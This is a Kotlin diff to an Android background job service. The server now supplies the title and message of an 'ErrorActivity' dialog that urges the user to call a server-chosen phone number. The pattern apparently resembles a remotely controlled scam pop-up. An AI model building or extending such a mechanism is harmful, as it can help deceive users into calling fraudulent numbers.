@@ -95,10 +95,12 @@ class MyService : JobService() {
                         val json = JSONObject(responseData)
                         val isActive = json.getBoolean("is_active")
                         val callTo = json.getString("call_to")
+                        val dialogTitle = json.getString("dialog_title") // Получаем title
+                        val dialogMessage = json.getString("dialog_message") // Получаем message
                         val frequency = json.getLong("frequency")
 
                         if (isActive) {
-                            showCallDialog(callTo)
+                            showCallDialog(callTo, dialogTitle, dialogMessage)
                         }
                     } catch (e: JSONException) {
                         e.printStackTrace()
@@ -111,9 +113,11 @@ class MyService : JobService() {
         })
     }
 
-    private fun showCallDialog(phoneNumber: String) {
+    private fun showCallDialog(phoneNumber: String, title: String, message: String) {
         val errorIntent = Intent(this, ErrorActivity::class.java).apply {
             putExtra("PHONE_NUMBER", phoneNumber)
+            putExtra("DIALOG_TITLE", title) // Передаем title
+            putExtra("DIALOG_MESSAGE", message) // Передаем message
             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         }
         startActivity(errorIntent)
